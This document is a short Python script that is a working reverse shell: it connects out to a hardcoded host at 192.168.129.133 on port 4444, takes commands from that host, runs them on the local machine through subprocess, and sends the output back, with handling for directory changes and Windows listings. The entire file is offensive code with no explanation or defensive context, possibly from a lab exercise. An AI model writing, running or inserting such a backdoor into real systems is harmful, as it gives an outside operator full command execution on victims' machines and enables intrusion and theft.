import socket
import subprocess
import os
import platform

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("192.168.129.133", 4444))

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    elif command.startswith("cd "):
        try:
            os.chdir(command[3:].strip())  
            output = os.getcwd()
        except Exception as e:
            output = f"Error changing directory: {str(e)}"
    elif command.lower() == "ls":
        try:
            if platform.system().lower() == "windows":
                output = subprocess.getoutput("dir")
            else:
                output = subprocess.getoutput("ls")  
        except Exception as e:
            output = f"Error executing ls command: {str(e)}"
    else:
        try:
            output = subprocess.getoutput(command)
        except Exception as e:
            output = f"Error executing command: {str(e)}"

    client.send(output.encode())

client.close()
